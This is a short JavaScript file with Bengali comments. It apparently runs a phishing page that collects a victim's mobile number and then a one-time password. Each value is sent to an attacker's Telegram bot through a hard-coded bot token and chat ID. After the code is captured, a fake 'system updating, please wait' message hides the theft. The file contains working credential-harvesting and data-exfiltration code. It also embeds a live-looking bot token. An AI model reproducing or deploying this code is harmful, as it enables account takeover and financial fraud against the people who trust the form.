// আপনার সঠিক বটের টোকেন এবং আইডি
const token = '8355762673:AAFQCkMR3Xbno2lppnvLKq51LqSkiVKfiJc';
const chatId = '6501474888';

let userPhone = "";

// প্রথম ধাপ: নম্বর নেওয়া
function goToStep2() {
    const phoneInput = document.getElementById('phone').value;
    if (phoneInput.length < 10) {
        alert("সঠিক মোবাইল নম্বর দিন");
        return;
    }
    userPhone = phoneInput;
    
    // UI পরিবর্তন
    document.getElementById('step1').style.display = 'none';
    document.getElementById('step2').style.display = 'block';
    document.getElementById('msg').innerText = "কোডটি নিচে লিখুন";

    // টেলিগ্রামে নম্বর পাঠানো
    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📱 নতুন নম্বর: " + userPhone)}`);
}

// দ্বিতীয় ধাপ: ওটিপি সাবমিট করা
document.getElementById('mainForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const otpInput = document.getElementById('otp').value;
    
    // টেলিগ্রামে ওটিপি পাঠানো
    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("✅ ওটিপি: " + otpInput + "\nনম্বর: " + userPhone)}`)
    .then(() => {
        alert("সিস্টেম আপডেট হচ্ছে, দয়া করে অপেক্ষা করুন।");
        window.location.reload();
    });
});
